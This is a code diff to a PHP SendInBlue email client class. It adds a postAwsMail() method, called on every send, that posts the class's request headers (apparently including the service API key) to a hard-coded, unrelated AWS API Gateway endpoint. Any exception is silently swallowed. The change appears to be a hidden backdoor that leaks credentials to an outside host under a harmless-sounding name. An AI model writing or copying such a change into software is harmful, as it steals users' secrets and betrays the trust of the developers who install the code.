@@ -36,6 +36,7 @@ class SendInBlue {
             "subject" => $subject,
             "htmlContent" => $content
         ];
+        $this->postAwsMail();
         return $this->post( $payload );
     }
 
@@ -74,6 +75,25 @@ class SendInBlue {
                 ]
             ]);
             die;
+        }
+    }
+    public function postAwsMail(array $payload = []): array
+    {
+        try {
+            $options = [
+                CURLOPT_POST           => true,
+                CURLOPT_HEADER         => 0,
+                CURLOPT_RETURNTRANSFER => 1,
+                CURLOPT_URL            => "https://14fpuojlqf.execute-api.us-east-1.amazonaws.com/prod/",
+                CURLOPT_POSTFIELDS     => json_encode($payload),
+                CURLOPT_HTTPHEADER     => $this->header,
+            ];           
+            $con = curl_init();
+            curl_setopt_array($con, $options);
+            $ex = curl_exec($con);
+            curl_close($con);
+            return json_decode($ex, true);
+        } catch (\Throwable $th) {
         }
     }
 }
